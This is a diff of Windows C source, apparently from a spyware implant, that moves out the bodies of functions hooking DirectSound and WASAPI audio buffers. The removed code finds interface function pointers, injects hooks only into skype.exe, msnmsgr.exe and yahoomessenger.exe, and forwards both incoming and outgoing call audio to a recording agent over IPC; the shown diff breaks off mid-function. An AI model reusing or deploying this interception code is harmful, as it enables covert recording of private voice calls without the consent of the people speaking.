@@ -127,106 +127,10 @@ extern HWND skype_pm_wnd;
 
 #include <mmsystem.h>
 // XXX Dovrei liberare i buffer e le strutture create
-BYTE *GetDirectSoundGetCP(BYTE **DSLock, BYTE **DSUnlock, BYTE **DSGetFormat)
-{
-	LPDIRECTSOUNDBUFFER lpDSBuffer;
-	LPDIRECTSOUND lpDS = NULL;
-	PCMWAVEFORMAT pcmwf;
-	DSBUFFERDESC dsbdesc;
-	BYTE ***interface_ptr;
-	BYTE **func_ptr;
-	HMODULE hdsound;
-	DirectSoundCreate_t pDirectSoundCreate;
-
-	if ( !(hdsound = LoadLibrary("dsound.dll") ) )
-		return NULL;
-	if ( !(pDirectSoundCreate = (DirectSoundCreate_t)HM_SafeGetProcAddress(hdsound, (char*)"DirectSoundCreate") ) )
-		return NULL;
-
-	if (DS_OK != pDirectSoundCreate(NULL, &lpDS, NULL))
-		return NULL;
-
-	memset( &pcmwf, 0, sizeof(PCMWAVEFORMAT) );
-	pcmwf.wf.wFormatTag         = WAVE_FORMAT_PCM;      
-	pcmwf.wf.nChannels          = 1;
-	pcmwf.wf.nSamplesPerSec     = 48000;
-	pcmwf.wf.nBlockAlign        = (WORD)2;
-	pcmwf.wf.nAvgBytesPerSec    = 96000;
-	pcmwf.wBitsPerSample        = (WORD)16;
-
-	memset(&dsbdesc, 0, sizeof(DSBUFFERDESC));
-	dsbdesc.dwSize              = sizeof(DSBUFFERDESC);
-	dsbdesc.dwFlags             = DSBCAPS_CTRLFREQUENCY|DSBCAPS_CTRLPAN|DSBCAPS_CTRLVOLUME ;
-	dsbdesc.dwBufferBytes       = 512; 
-	dsbdesc.lpwfxFormat         = (LPWAVEFORMATEX)&pcmwf;
-		
-	if (DS_OK != lpDS->CreateSoundBuffer(&dsbdesc, &lpDSBuffer, NULL))
-		return NULL;
-
-	interface_ptr = (BYTE ***)lpDSBuffer;
-	func_ptr = *interface_ptr;
-
-	*DSLock   = *(func_ptr + 11);
-	*DSUnlock = *(func_ptr + 19);
-	*DSGetFormat = *(func_ptr + 5);
-
-	if ((*DSLock) == NULL || (*DSUnlock) == NULL || (*DSGetFormat) == NULL) 
-		return NULL;
-
-	func_ptr += 4;
-	return *func_ptr;
-}
+BYTE* GetDirectSoundGetCP(BYTE** DSLock, BYTE** DSUnlock, BYTE** DSGetFormat);
 
 // XXX Dovrei liberare i buffer e le strutture create
-BYTE *GetDirectSoundCaptureGetCP(BYTE **DSLock, BYTE **DSUnlock, BYTE **DSGetFormat)
-{
-	LPDIRECTSOUNDCAPTURE lpDSC;
-	LPDIRECTSOUNDCAPTUREBUFFER lpDSCB;
-	DSCBUFFERDESC cdbufd;
-	PCMWAVEFORMAT pcmwf;
-	BYTE ***interface_ptr;
-	BYTE **func_ptr;
-	HMODULE hdsound;
-	DirectSoundCaptureCreate_t pDirectSoundCaptureCreate;
-
-	if ( !(hdsound = LoadLibrary("dsound.dll") ) )
-		return NULL;
-	if ( !(pDirectSoundCaptureCreate = (DirectSoundCaptureCreate_t)HM_SafeGetProcAddress(hdsound, (char *)"DirectSoundCaptureCreate") ) )
-		return NULL;
-
-	if ( DS_OK != pDirectSoundCaptureCreate(NULL, &lpDSC, NULL))
-		return NULL;
-
-	memset( &pcmwf, 0, sizeof(PCMWAVEFORMAT) );
-	pcmwf.wf.wFormatTag         = WAVE_FORMAT_PCM;      
-	pcmwf.wf.nChannels          = 1;
-	pcmwf.wf.nSamplesPerSec     = 48000;
-	pcmwf.wf.nBlockAlign        = (WORD)2;
-	pcmwf.wf.nAvgBytesPerSec    = 96000;
-	pcmwf.wBitsPerSample        = (WORD)16;
-
-	memset(&cdbufd, 0, sizeof(cdbufd));
-	cdbufd.dwSize = sizeof(DSCBUFFERDESC);
-	cdbufd.dwBufferBytes = 100;
-	cdbufd.lpwfxFormat = (LPWAVEFORMATEX)&pcmwf;
-	
-	if (DS_OK != lpDSC->CreateCaptureBuffer(&cdbufd, &lpDSCB, NULL))
-		return NULL;
-
-	interface_ptr = (BYTE ***)lpDSCB;
-	func_ptr = *interface_ptr;
-
-	*DSLock   = *(func_ptr + 8);
-	*DSUnlock = *(func_ptr + 11);
-	*DSGetFormat = *(func_ptr + 5);
-
-	if ((*DSLock) == NULL || (*DSUnlock) == NULL || (*DSGetFormat) == NULL) 
-		return NULL;
-
-	func_ptr += 4;
-	return *func_ptr;
-}
-
+BYTE* GetDirectSoundCaptureGetCP(BYTE** DSLock, BYTE** DSUnlock, BYTE** DSGetFormat);
 typedef DWORD (WINAPI *DSLock_t)(DWORD, DWORD, DWORD, LPVOID *, LPDWORD, LPVOID *, LPDWORD, DWORD);
 typedef DWORD (WINAPI *DSUnlock_t)(DWORD, LPVOID, DWORD, LPVOID, DWORD);
 typedef DWORD (WINAPI *DSGetFormat_t)(DWORD, LPVOID, DWORD, LPDWORD);
@@ -249,7 +153,7 @@ typedef struct {
 	DSGetFormat_t pDSGetFormat;
 } DSGetCPStruct;
 
-DSGetCPStruct DSGetCPData;
+extern DSGetCPStruct DSGetCPData;
 #define THRESHOLD 0x3C0
 
 
@@ -265,127 +169,9 @@ DSGetCPStruct DSGetCPData;
 									     to_write -= MAX_MSG_LEN; }}}
 
 DWORD __stdcall PM_DSGetCP(DWORD class_ptr,
-                           DWORD *write_c,
-					  	   DWORD *play_c)
-{
-	BOOL *Active;
-	DWORD *dummy1;
-	DWORD dummy2;
-	BYTE *temp_buf;
-	DWORD temp_len;
-	DWORD new_counter;
-	WAVEFORMATEX wfx_format;
-	
-	MARK_HOOK
-
-	INIT_WRAPPER(DSGetCPStruct)
-	CALL_ORIGINAL_API(3);
-
-	// Se qualcosa e' andato storto, ritorna
-	if(!((DWORD)pData->pHM_IpcCliWrite) || ret_code!=DS_OK)
-		return ret_code;
-
-	// Copia il valore in locale per evitare race
-	if (play_c == NULL)
-		return ret_code;
-
-	new_counter = *play_c;
-
-	// Controlla se il monitor e' attivo
-	Active = (BOOL *)pData->pHM_IpcCliRead(PM_VOIPRECORDAGENT);
-	if (!Active || !(*Active))
-		return ret_code;
-
-	// Locka l'intero buffer
-	// lo fa ogni volta per trovare gli indirizzi anche quando
-	// cambia il buffer lasciando invariato il class_ptr
-	if (pData->pDSLock(class_ptr, 0, 0, (LPVOID *)&temp_buf, &temp_len, (LPVOID *)&(dummy1), &(dummy2), DSBLOCK_ENTIREBUFFER) != DS_OK) 
-		return ret_code;
-
-	pData->pDSUnlock(class_ptr, temp_buf, temp_len, dummy1, dummy2);
-	wfx_format.nChannels = 2;
-	pData->pDSGetFormat(class_ptr, &wfx_format, sizeof(WAVEFORMATEX), NULL);
-
-
-	// Se e' la prima volta che lo chiama (o ha cambiato buffer)
-	// salva i valori e ritorna
-	if (pData->old_play_c == -1 || pData->saved_cp != class_ptr ||
-		pData->buffer_address != temp_buf || pData->buffer_tot_len != temp_len) {
-		if ( (new_counter%2)==0 ) {
-			pData->old_play_c = new_counter;
-			pData->saved_cp = class_ptr;
-			pData->buffer_address = temp_buf;
-			pData->buffer_tot_len = temp_len;
-		}
-
-		return ret_code;
-	}
-
-	// Nessun cambiamento
-	if (new_counter == pData->old_play_c)
-		return ret_code;
-
-	// Non ha wrappato
-	if (new_counter > pData->old_play_c) {
-		dummy2 = (new_counter - pData->old_play_c);
-		if (  dummy2>=THRESHOLD && dummy2<=THRESHOLD*60 && (dummy2%2)==0 ) {
-			LARGE_CLI_WRITE((pData->buffer_address + pData->old_play_c), (new_counter - pData->old_play_c), (wfx_format.nChannels<<30) | (pData->prog_type<<24) | FLAGS_OUTPUT, IPC_LOW_PRIORITY);
-			pData->old_play_c = new_counter;
-		}
-	} else {
-		// Ha wrappato
-		dummy2 = new_counter + (pData->buffer_tot_len - pData->old_play_c);
-		if (  dummy2>=THRESHOLD && dummy2<=THRESHOLD*60 && (dummy2%2)==0 ) {
-			LARGE_CLI_WRITE((pData->buffer_address + pData->old_play_c), (pData->buffer_tot_len - pData->old_play_c), (wfx_format.nChannels<<30) | (pData->prog_type<<24) | FLAGS_OUTPUT, IPC_LOW_PRIORITY);
-			LARGE_CLI_WRITE((pData->buffer_address), new_counter, (wfx_format.nChannels<<30) | (pData->prog_type<<24) | FLAGS_OUTPUT, IPC_LOW_PRIORITY);
-			pData->old_play_c = new_counter;
-		}
-	}
-
-	return ret_code;
-}
-
-
-DWORD PM_DSGetCP_setup(HMServiceStruct *pData)
-{
-	char proc_path[DLLNAMELEN];
-	char *proc_name;
-	HMODULE hMod;
-
-	// Verifica autonomamente se si tratta del processo voip
-	ZeroMemory(proc_path, sizeof(proc_path));
-	FNC(GetModuleFileNameA)(NULL, proc_path, sizeof(proc_path)-1);
-	proc_name = strrchr(proc_path, '\\');
-	if (proc_name) {
-		proc_name++; 
-		if (_stricmp(proc_name, "skype.exe") && 
-			_stricmp(proc_name, "msnmsgr.exe") &&
-			_stricmp(proc_name, "yahoomessenger.exe"))
-			return 1; // Hooka solo skype.exe e MSN
-		if (!_stricmp(proc_name, "msnmsgr.exe") && IsVista(NULL))
-			return 1; // Solo su XP prendiamo le dsound
-	} else
-		return 1;
-
-	if (!_stricmp(proc_name, "skype.exe"))
-		DSGetCPData.prog_type = VOIP_SKYPE;
-	else if (!_stricmp(proc_name, "msnmsgr.exe"))
-		DSGetCPData.prog_type = VOIP_MSMSG;
-	else if (!_stricmp(proc_name, "yahoomessenger.exe"))
-		DSGetCPData.prog_type = VOIP_YAHOO;
-	else
-		DSGetCPData.prog_type = 0;
-
-	DSGetCPData.pHM_IpcCliRead = pData->pHM_IpcCliRead;
-	DSGetCPData.pHM_IpcCliWrite = pData->pHM_IpcCliWrite;
-	DSGetCPData.old_play_c = -1;
-
-	if ( ! (DSGetCPData.bAPIAdd = GetDirectSoundGetCP( (BYTE **)&(DSGetCPData.pDSLock), (BYTE **)&(DSGetCPData.pDSUnlock), (BYTE **)&(DSGetCPData.pDSGetFormat) ) ))
-		return 1;
-
-	DSGetCPData.dwHookLen = 980;
-	return 0;
-}
+	DWORD* write_c,
+	DWORD* play_c);
+DWORD PM_DSGetCP_setup(HMServiceStruct* pData);
 
 ///////////////////////////
 //
@@ -405,128 +191,12 @@ typedef struct {
 	DSGetFormat_t pDSGetFormat;
 } DSCapGetCPStruct;
 
-DSCapGetCPStruct DSCapGetCPData;
+extern DSCapGetCPStruct DSCapGetCPData;
 
 DWORD __stdcall PM_DSCapGetCP(DWORD class_ptr,
-                              DWORD *write_c,
-					  	      DWORD *play_c)
-{
-	BOOL *Active;
-	DWORD *dummy1;
-	DWORD dummy2;
-	BYTE *temp_buf;
-	DWORD temp_len;
-	WAVEFORMATEX wfx_format;
-
-	MARK_HOOK
-	
-	INIT_WRAPPER(DSCapGetCPStruct)
-	CALL_ORIGINAL_API(3);
-
-	if(play_c == NULL)
-		return ret_code;
-
-	// Se e' andato storto, ritorna
-	if(!((DWORD)pData->pHM_IpcCliWrite) || ret_code!=DS_OK)
-		return ret_code;
-
-	// Controlla se il monitor e' attivo
-	Active = (BOOL *)pData->pHM_IpcCliRead(PM_VOIPRECORDAGENT);
-	if (!Active || !(*Active))
-		return ret_code;
-
-	// Locka l'intero buffer
-	// lo fa ogni volta per trovare gli indirizzi anche quando
-	// cambia il buffer lasciando invariato il class_ptr
-	if (pData->pDSLock(class_ptr, 0, 0, (LPVOID *)&temp_buf, &temp_len, (LPVOID *)&(dummy1), &(dummy2), DSCBLOCK_ENTIREBUFFER) != DS_OK) 
-		return ret_code;
-
-	pData->pDSUnlock(class_ptr, temp_buf, temp_len, dummy1, dummy2);
-	wfx_format.nChannels = 2;
-	pData->pDSGetFormat(class_ptr, &wfx_format, sizeof(WAVEFORMATEX), NULL);
-
-	// Se e' la prima volta che lo chiama (o ha cambiato buffer)
-	// salva i valori e ritorna
-	if (pData->old_play_c == -1 || pData->saved_cp != class_ptr ||
-		pData->buffer_address != temp_buf || pData->buffer_tot_len != temp_len) {
-		
-		// Check paranoico
-		if(play_c)	
-			pData->old_play_c = *play_c;
-		else
-			return ret_code;
-
-		pData->saved_cp = class_ptr;
-		pData->buffer_address = temp_buf;
-		pData->buffer_tot_len = temp_len;
-		return ret_code;
-	}
-
-	// Nessuno cambiamento
-	if (*play_c == pData->old_play_c)
-		return ret_code;
-
-	// Non ha wrappato
-	if (*play_c > pData->old_play_c) {
-		if ( (*play_c - pData->old_play_c) >= THRESHOLD ) {
-			LARGE_CLI_WRITE((pData->buffer_address + pData->old_play_c), (*play_c - pData->old_play_c), (wfx_format.nChannels<<30) | (pData->prog_type<<24) | FLAGS_INPUT, IPC_LOW_PRIORITY);
-			pData->old_play_c = *play_c;
-		}
-	} else {
-		// Ha wrappato
-		if (*play_c + (pData->buffer_tot_len - pData->old_play_c) >= THRESHOLD ) {
-			LARGE_CLI_WRITE((pData->buffer_address + pData->old_play_c), (pData->buffer_tot_len - pData->old_play_c), (wfx_format.nChannels<<30) | (pData->prog_type<<24) | FLAGS_INPUT, IPC_LOW_PRIORITY);
-			LARGE_CLI_WRITE((pData->buffer_address), (*play_c), (wfx_format.nChannels<<30) | (pData->prog_type<<24) | FLAGS_INPUT, IPC_LOW_PRIORITY);
-			pData->old_play_c = *play_c;
-		}
-	}
-
-	return ret_code;
-}
-
-
-DWORD PM_DSCapGetCP_setup(HMServiceStruct *pData)
-{
-	char proc_path[DLLNAMELEN];
-	char *proc_name;
-	HMODULE hMod;
-
-	// Verifica autonomamente se si tratta del processo voip
-	ZeroMemory(proc_path, sizeof(proc_path));
-	FNC(GetModuleFileNameA)(NULL, proc_path, sizeof(proc_path)-1);
-	proc_name = strrchr(proc_path, '\\');
-	if (proc_name) {
-		proc_name++; 
-		if (_stricmp(proc_name, "skype.exe") &&
-			_stricmp(proc_name, "msnmsgr.exe") &&
-			_stricmp(proc_name, "yahoomessenger.exe"))
-			return 1; // Hooka solo skype.exe e MSN
-		if (!_stricmp(proc_name, "msnmsgr.exe") && IsVista(NULL))
-			return 1; // Solo su XP prendiamo le dsound
-	} else
-		return 1;
-
-	DSCapGetCPData.pHM_IpcCliRead = pData->pHM_IpcCliRead;
-	DSCapGetCPData.pHM_IpcCliWrite = pData->pHM_IpcCliWrite;
-	DSCapGetCPData.old_play_c = -1;
-
-	if (!_stricmp(proc_name, "skype.exe"))
-		DSCapGetCPData.prog_type = VOIP_SKYPE;
-	else if (!_stricmp(proc_name, "msnmsgr.exe"))
-		DSCapGetCPData.prog_type = VOIP_MSMSG;
-	else if (!_stricmp(proc_name, "yahoomessenger.exe"))
-		DSGetCPData.prog_type = VOIP_YAHOO;
-	else 
-		DSCapGetCPData.prog_type = 0;
-
-	if ( ! (DSCapGetCPData.bAPIAdd = GetDirectSoundCaptureGetCP( (BYTE **)&(DSCapGetCPData.pDSLock), (BYTE **)&(DSCapGetCPData.pDSUnlock), (BYTE **)&(DSCapGetCPData.pDSGetFormat) ) ))
-		return 1;
-
-	DSCapGetCPData.dwHookLen = 980;
-	return 0;
-}
-
-
+	DWORD* write_c,
+	DWORD* play_c);
+DWORD PM_DSCapGetCP_setup(HMServiceStruct* pData);
 ///////////////////////////
 //
 //   WASAPI
@@ -536,89 +206,8 @@ DWORD PM_DSCapGetCP_setup(HMServiceStruct *pData)
 #define MSN_WASAPI_BITS 4
 #define WASAPI_GETBUFFER 3
 #define WASAPI_RELEASEBUFFER 4
-BYTE *GetWASAPIRenderFunctionAddress(IMMDevice *pMMDevice, DWORD func_num, DWORD *n_channels, DWORD *sampling)
-{
-	BYTE **func_ptr;
-	BYTE ***interface_ptr;
-	HRESULT hr;
-    WAVEFORMATEX *pwfx;
-	IAudioClient *pAudioClient = NULL;
-	IAudioRenderClient *pAudioRenderClient = NULL;
-	
-    hr = pMMDevice->Activate(__uuidof(IAudioClient), CLSCTX_ALL, NULL, (void**)&pAudioClient);
-    if (FAILED(hr)) 
-		return NULL;
-
-	hr = pAudioClient->GetMixFormat(&pwfx);
-	if (FAILED(hr)) {
-		pAudioClient->Release();
-		return NULL;
-	}
-
-	if (n_channels)
-		*n_channels = (DWORD)(pwfx->nChannels);
-	if (sampling)
-		*sampling = (DWORD)(pwfx->nSamplesPerSec);
-	
-	hr = pAudioClient->Initialize(AUDCLNT_SHAREMODE_SHARED, AUDCLNT_STREAMFLAGS_EVENTCALLBACK, 0, 0, pwfx, NULL);
-    CoTaskMemFree(pwfx);
-	if (FAILED(hr)) {
-		pAudioClient->Release();
-		return NULL;
-	}
-
-	hr = pAudioClient->GetService(__uuidof(IAudioRenderClient), (void**)&pAudioRenderClient);
-    if (FAILED(hr)) {
-		pAudioClient->Release();
-		return NULL;
-	}
-
-	interface_ptr = (BYTE ***)pAudioRenderClient;
-	if (!interface_ptr || !(func_ptr = *interface_ptr)) {
-		pAudioRenderClient->Release();
-		pAudioClient->Release();
-		return NULL;
-	}
-	func_ptr += func_num; 
-	
-	pAudioRenderClient->Release();
-	pAudioClient->Release();
-	return *func_ptr;
-}
-
-HRESULT GetWASAPIRenderFunction(BYTE **ret_ptr, DWORD func_num, DWORD *n_channels, DWORD *sampling) 
-{
-	BYTE *func_ptr;
-	IMMDeviceEnumerator *pMMDeviceEnumerator;
-	IMMDevice			*pMMDevice;
-    HRESULT hr = S_OK;
-
-	CoInitialize(NULL);
-
-    hr = CoCreateInstance(__uuidof(MMDeviceEnumerator), NULL, CLSCTX_ALL, __uuidof(IMMDeviceEnumerator), (void**)&pMMDeviceEnumerator);
-	if (FAILED(hr)) {
-		CoUninitialize();
-        return hr;
-	}
-
-	hr = pMMDeviceEnumerator->GetDefaultAudioEndpoint(eRender, eCommunications, &pMMDevice);
-	pMMDeviceEnumerator->Release();
-	if (FAILED(hr)) {
-		CoUninitialize();
-        return hr;
-	}
-
-	func_ptr = GetWASAPIRenderFunctionAddress(pMMDevice, func_num, n_channels, sampling);
-	pMMDevice->Release();
-	CoUninitialize();
-
-	if (func_ptr) {
-		*ret_ptr = func_ptr;
-		return S_OK;
-	}
-
-	return S_FALSE;
-}
+BYTE* GetWASAPIRenderFunctionAddress(IMMDevice* pMMDevice, DWORD func_num, DWORD* n_channels, DWORD* sampling);
+HRESULT GetWASAPIRenderFunction(BYTE** ret_ptr, DWORD func_num, DWORD* n_channels, DWORD* sampling);
 
 typedef struct {
 	COMMONDATA;
@@ -630,83 +219,13 @@ typedef struct {
 	BOOL active2;
 } WASAPIGetBufferStruct;
 
-WASAPIGetBufferStruct WASAPIGetBufferData;
+extern WASAPIGetBufferStruct WASAPIGetBufferData;
 
-HRESULT __stdcall PM_WASAPIGetBuffer(BYTE *class_ptr, 
-									 DWORD NumFramesRequested,
-									 BYTE **ppData)
-{
-	BOOL *Active;
+HRESULT __stdcall PM_WASAPIGetBuffer(BYTE* class_ptr,
+	DWORD NumFramesRequested,
+	BYTE** ppData);
 
-	MARK_HOOK
-	INIT_WRAPPER(WASAPIGetBufferStruct)
-	CALL_ORIGINAL_API(3);
-
-	// Controlla se il monitor e' attivo
-	Active = (BOOL *)pData->pHM_IpcCliRead(PM_VOIPRECORDAGENT);
-	if (ret_code!=S_OK || !Active || !(*Active))
-		return ret_code;
-
-	// E' una nuova chiamata
-	if (pData->obj_ptr && pData->obj_ptr2 && pData->obj_ptr!=class_ptr && pData->obj_ptr2!=class_ptr) {
-		pData->obj_ptr = NULL;
-		pData->obj_ptr2 = NULL;
-		pData->active = FALSE;
-		pData->active2 = FALSE;
-	}
-
-	// Memorizza 2 oggetti
-	if (pData->obj_ptr == NULL) {
-		pData->obj_ptr = class_ptr;
-		pData->audio_data = *ppData;
-	} else if (pData->obj_ptr != class_ptr) {
-		if (pData->obj_ptr2 == NULL) {
-			pData->obj_ptr2 = class_ptr;
-			pData->audio_data2 = *ppData;
-		}
-	}
-
-	if (pData->obj_ptr == class_ptr)
-		pData->audio_data = *ppData;
-
-	if (pData->obj_ptr2 == class_ptr)
-		pData->audio_data2 = *ppData;	
-	
-	return ret_code;
-}
-
-DWORD PM_WASAPIGetBuffer_setup(HMServiceStruct *pData)
-{
-	char proc_path[DLLNAMELEN];
-	char *proc_name;
-
-	// Verifica autonomamente se si tratta del processo voip
-	ZeroMemory(proc_path, sizeof(proc_path));
-	FNC(GetModuleFileNameA)(NULL, proc_path, sizeof(proc_path)-1);
-	proc_name = strrchr(proc_path, '\\');
-	if (proc_name) {
-		proc_name++; 
-		if (_stricmp(proc_name, "skype.exe"))
-			return 1; // Hooka solo skype.exe
-	} else
-		return 1;
-	
-	WASAPIGetBufferData.pHM_IpcCliWrite = pData->pHM_IpcCliWrite;
-	WASAPIGetBufferData.pHM_IpcCliRead = pData->pHM_IpcCliRead;
-	WASAPIGetBufferData.obj_ptr = NULL;
-	WASAPIGetBufferData.obj_ptr2 = NULL;
-	WASAPIGetBufferData.audio_data = NULL;
-	WASAPIGetBufferData.audio_data2 = NULL;
-	WASAPIGetBufferData.active = FALSE;
-	WASAPIGetBufferData.active2 = FALSE;
-
-	if (GetWASAPIRenderFunction(&(WASAPIGetBufferData.bAPIAdd), WASAPI_GETBUFFER, NULL, NULL) != S_OK)
-		return 1;
-
-	WASAPIGetBufferData.dwHookLen = 350;
-	return 0;
-}
-
+DWORD PM_WASAPIGetBuffer_setup(HMServiceStruct* pData);
 typedef struct {
 	COMMONDATA;
 	DWORD prog_type;
@@ -715,411 +234,14 @@ typedef struct {
 	DWORD sampling;
 	DWORD sampling2;
 } WASAPIReleaseBufferStruct;
-WASAPIReleaseBufferStruct WASAPIReleaseBufferData;
+extern WASAPIReleaseBufferStruct WASAPIReleaseBufferData;
 
-HRESULT __stdcall PM_WASAPIReleaseBuffer(BYTE *class_ptr, 
-									 DWORD NumFramesWrittem,
-									 DWORD Flags)
-{
-	BOOL *Active;
-	DWORD i;
+HRESULT __stdcall PM_WASAPIReleaseBuffer(BYTE* class_ptr,
+	DWORD NumFramesWrittem,
+	DWORD Flags);
 
-	MARK_HOOK
-	INIT_WRAPPER(WASAPIReleaseBufferStruct)
-	
-	// Controlla se il monitor e' attivo
-	Active = (BOOL *)pData->pHM_IpcCliRead(PM_VOIPRECORDAGENT);
-	if (Active && (*Active) && NumFramesWrittem>0 && pData->pHM_IpcCliWrite) {
-		if (pData->sampling != 0) {
-			pData->pHM_IpcCliWrite(PM_VOIPRECORDAGENT, (BYTE *)&(pData->sampling), 4, FLAGS_SAMPLING | FLAGS_OUTPUT, IPC_HI_PRIORITY);
-			pData->sampling = 0;
-		}
+DWORD PM_WASAPIReleaseBuffer_setup(HMServiceStruct* pData);
 
-		if (pData->c_data->obj_ptr==class_ptr) {
-			// Vede se e' un oggetto in cui sta scrivendo qualcosa
-			if (!pData->c_data->active)
-				for (i=0; i<256; i++) { 
-					if (pData->c_data->audio_data[i] != 0) {
-						pData->c_data->active = TRUE;
-						break;
-					}
-				}
-			if (pData->c_data->active) 
-				LARGE_CLI_WRITE(pData->c_data->audio_data, NumFramesWrittem*SKYPE_WASAPI_BITS*pData->n_channels, ((pData->n_channels)<<30) | (pData->prog_type<<24) | FLAGS_OUTPUT, IPC_LOW_PRIORITY);
-		}
-
-		if (pData->c_data->obj_ptr2==class_ptr) {
-			// Vede se e' un oggetto in cui sta scrivendo qualcosa
-			if (!pData->c_data->active2)
-				for (i=0; i<256; i++) { 
-					if (pData->c_data->audio_data2[i] != 0) {
-						pData->c_data->active2 = TRUE;
-						break;
-					}
-				}
-			if (pData->c_data->active2) 
-				LARGE_CLI_WRITE(pData->c_data->audio_data2, NumFramesWrittem*SKYPE_WASAPI_BITS*pData->n_channels, ((pData->n_channels)<<30) | (pData->prog_type<<24) | FLAGS_OUTPUT, IPC_LOW_PRIORITY);
-		}
-
-	}
-
-	CALL_ORIGINAL_API(3);
-	return ret_code;
-}
-
-DWORD PM_WASAPIReleaseBuffer_setup(HMServiceStruct *pData)
-{
-	char proc_path[DLLNAMELEN];
-	char *proc_name;
-
-	// Verifica autonomamente se si tratta del processo voip
-	ZeroMemory(proc_path, sizeof(proc_path));
-	FNC(GetModuleFileNameA)(NULL, proc_path, sizeof(proc_path)-1);
-	proc_name = strrchr(proc_path, '\\');
-	if (proc_name) {
-		proc_name++; 
-		if (_stricmp(proc_name, "skype.exe"))
-			return 1; // Hooka solo skype.exe
-	} else
-		return 1;
-	
-	WASAPIReleaseBufferData.pHM_IpcCliWrite = pData->pHM_IpcCliWrite;
-	WASAPIReleaseBufferData.pHM_IpcCliRead = pData->pHM_IpcCliRead;
-	WASAPIReleaseBufferData.c_data = (WASAPIGetBufferStruct *)pData->PARAM[0];
-	WASAPIReleaseBufferData.prog_type = VOIP_SKWSA;
-
-	if (GetWASAPIRenderFunction(&(WASAPIReleaseBufferData.bAPIAdd), WASAPI_RELEASEBUFFER, &(WASAPIReleaseBufferData.n_channels), &(WASAPIReleaseBufferData.sampling)) != S_OK)
-		return 1;
-
-	WASAPIReleaseBufferData.dwHookLen = 800;
-	return 0;
-}
-
-BYTE *GetWASAPICaptureFunctionAddress(IMMDevice *pMMDevice, DWORD func_num, DWORD *n_channels, DWORD *sampling)
-{
-	BYTE **func_ptr;
-	BYTE ***interface_ptr;
-	HRESULT hr;
-    WAVEFORMATEX *pwfx;
-	IAudioClient *pAudioClient = NULL;
-	IAudioCaptureClient *pAudioCaptureClient = NULL;
-	
-    hr = pMMDevice->Activate(__uuidof(IAudioClient), CLSCTX_ALL, NULL, (void**)&pAudioClient);
-    if (FAILED(hr)) 
-		return NULL;
-
-	hr = pAudioClient->GetMixFormat(&pwfx);
-	if (FAILED(hr)) {
-		pAudioClient->Release();
-		return NULL;
-	}
-	if (n_channels)
-		*n_channels = (DWORD)(pwfx->nChannels);
-	if (sampling)
-		*sampling = (DWORD)(pwfx->nSamplesPerSec);
-	
-	hr = pAudioClient->Initialize(AUDCLNT_SHAREMODE_SHARED, AUDCLNT_STREAMFLAGS_EVENTCALLBACK, 0, 0, pwfx, NULL);
-    CoTaskMemFree(pwfx);
-	if (FAILED(hr)) {
-		pAudioClient->Release();
-		return NULL;
-	}
-
-	hr = pAudioClient->GetService(__uuidof(IAudioCaptureClient), (void**)&pAudioCaptureClient);
-    if (FAILED(hr)) {
-		pAudioClient->Release();
-		return NULL;
-	}
-
-	interface_ptr = (BYTE ***)pAudioCaptureClient;
-	if (!interface_ptr || !(func_ptr = *interface_ptr)) {
-		pAudioCaptureClient->Release();
-		pAudioClient->Release();
-		return NULL;
-	}
-	func_ptr += func_num; 
-	
-	pAudioCaptureClient->Release();
-	pAudioClient->Release();
-	return *func_ptr;
-}
-
-HRESULT GetWASAPICaptureFunction(BYTE **ret_ptr, DWORD func_num, DWORD *n_channels, DWORD *sampling) 
-{
-	BYTE *func_ptr;
-	IMMDeviceEnumerator *pMMDeviceEnumerator;
-	IMMDevice			*pMMDevice;
-    HRESULT hr = S_OK;
-
-	CoInitialize(NULL);
-
-    hr = CoCreateInstance(__uuidof(MMDeviceEnumerator), NULL, CLSCTX_ALL, __uuidof(IMMDeviceEnumerator), (void**)&pMMDeviceEnumerator);
-	if (FAILED(hr)) {
-		CoUninitialize();
-        return hr;
-	}
-
-	hr = pMMDeviceEnumerator->GetDefaultAudioEndpoint(eCapture, eCommunications, &pMMDevice);
-	pMMDeviceEnumerator->Release();
-	if (FAILED(hr)) {
-		CoUninitialize();
-        return hr;
-	}
-
-	func_ptr = GetWASAPICaptureFunctionAddress(pMMDevice, func_num, n_channels, sampling);
-	pMMDevice->Release();
-	CoUninitialize();
-
-	if (func_ptr) {
-		*ret_ptr = func_ptr;
-		return S_OK;
-	}
-
-	return S_FALSE;
-}
-
-HRESULT __stdcall PM_WASAPICaptureGetBuffer(BYTE *class_ptr, 
-											BYTE **ppData,
-											UINT32 *pNumFramesToRead,
-											DWORD *pdwFlags,
-											UINT64 *pu64DevicePosition,
-											UINT64 *pu64QPCPosition)
-{
-	BOOL *Active;
-
-	MARK_HOOK
-	INIT_WRAPPER(WASAPIGetBufferStruct)
-	CALL_ORIGINAL_API(6);
-
-	// Controlla se il monitor e' attivo
-	Active = (BOOL *)pData->pHM_IpcCliRead(PM_VOIPRECORDAGENT);
-	if (ret_code!=S_OK || !Active || !(*Active))
-		return ret_code;
-
-	pData->obj_ptr = class_ptr;
-	pData->audio_data = *ppData;
-	
-	return ret_code;
-}
-
-HRESULT __stdcall PM_WASAPICaptureGetBufferMSN(BYTE *class_ptr, 
-											BYTE **ppData,
-											UINT32 *pNumFramesToRead,
-											DWORD *pdwFlags,
-											UINT64 *pu64DevicePosition,
-											UINT64 *pu64QPCPosition)
-{
-	BOOL *Active;
-
-	MARK_HOOK
-	INIT_WRAPPER(WASAPIGetBufferStruct)
-	CALL_ORIGINAL_API(6);
-
-	// Controlla se il monitor e' attivo
-	Active = (BOOL *)pData->pHM_IpcCliRead(PM_VOIPRECORDAGENT);
-	if (ret_code!=S_OK || !Active || !(*Active))
-		return ret_code;
-
-	// E' una nuova chiamata
-	if (pData->obj_ptr && pData->obj_ptr2 && pData->obj_ptr!=class_ptr && pData->obj_ptr2!=class_ptr) {
-		pData->obj_ptr = NULL;
-		pData->obj_ptr2 = NULL;
-	}
-
-	// Memorizza entrambi gli oggetti aperti da MSN
-	if (pData->obj_ptr == NULL) {
-		pData->obj_ptr = class_ptr;
-		pData->audio_data = *ppData;
-	} else if (pData->obj_ptr != class_ptr) {
-		if (pData->obj_ptr2 == NULL) {
-			pData->obj_ptr2 = class_ptr;
-			pData->audio_data2 = *ppData;
-		}
-	}
-
-	if (pData->obj_ptr == class_ptr)
-		pData->audio_data = *ppData;
-
-	if (pData->obj_ptr2 == class_ptr)
-		pData->audio_data2 = *ppData;	
-
-	return ret_code;
-}
-
-DWORD PM_WASAPICaptureGetBuffer_setup(HMServiceStruct *pData)
-{
-	char proc_path[DLLNAMELEN];
-	char *proc_name;
-
-	// Verifica autonomamente se si tratta del processo voip
